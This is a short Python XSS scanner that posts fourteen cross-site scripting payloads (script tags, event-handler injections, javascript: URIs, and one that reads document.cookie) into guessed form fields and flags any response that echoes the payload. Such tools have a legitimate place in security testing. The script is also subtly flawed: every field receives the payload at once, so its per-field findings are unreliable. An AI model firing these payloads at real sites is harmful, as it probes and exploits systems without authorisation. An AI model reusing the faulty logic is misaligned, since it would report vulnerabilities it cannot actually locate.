import requests
from urllib.parse import urlencode, urlparse, parse_qs


target_url = 'http://example.com/form'

xss_payloads = [
    "<script>alert('XSS1')</script>",
    "<img src='invalid' onerror=alert('XSS2')>",
    "<svg/onload=alert('XSS3')>",
    "<body onload=alert('XSS4')>",
    "' onfocus='alert(document.cookie)' autofocus=''",
    "<iframe src='javascript:alert(\"XSS5\");'>",
    "javascript:alert('XSS6')",
    "<input type='image' src='x' onerror=alert('XSS7')>",
    "'\" onmouseover=alert('XSS8') //",
    "<div style='background:url(javascript:alert(\"XSS9\"))'>",
    "<base href='javascript:alert(\"XSS10\")//'>",
    "<div style='xss:expr/*XSS*/ession(alert(\"XSS11\"))'>",
    "<iframe srcdoc='<script>alert(\"XSS12\")</script>'>",
    "<object data='javascript:alert(\"XSS13\")'>"
]

def scan_xss(url):
    print(f"Scanning {url} for XSS vulnerabilities...")
    # Pretpostavimo da su neka osnovna polja prisutna na formi, može se dinamički izvući iz stranice
    form_fields = ['name', 'email', 'comment', 'search']
    for payload in xss_payloads:
        for field in form_fields:
            # Podaci za slanje, sa XSS payloadom u svakom polju redom
            data = {field: payload for field in form_fields}
            try:
                response = requests.post(url, data=data)
                if payload in response.text:
                    print(f"Potential XSS detected at {field} with payload: {payload}")
            except requests.RequestException as e:
                print(f"Error while requesting {url}: {str(e)}")


scan_xss(target_url)
